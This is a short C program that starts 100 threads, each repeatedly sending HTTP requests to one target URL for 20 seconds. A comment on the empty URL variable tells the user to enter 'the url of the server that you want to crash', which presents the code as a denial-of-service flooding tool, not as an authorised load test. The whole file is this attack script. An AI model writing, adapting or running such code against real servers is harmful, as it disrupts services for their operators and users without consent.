#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <unistd.h>

#define THREAD_COUNT 100
#define DURATION 20

volatile int stop_threads = 0;

void* send_request(void* url) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        while (!stop_threads) {
            curl_easy_setopt(curl, CURLOPT_URL, (char*)url);
            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            } else {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                printf("Response: %ld\n", response_code);
            }

            usleep(100000);
        }
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return NULL;
}

int main() {
    const char* target_url = ""; // write the url of the server that you want to crash
    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_request, (void*)target_url);
    }

    sleep(DURATION);
    stop_threads = 1;

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Test completed.\n");
    return 0;
}
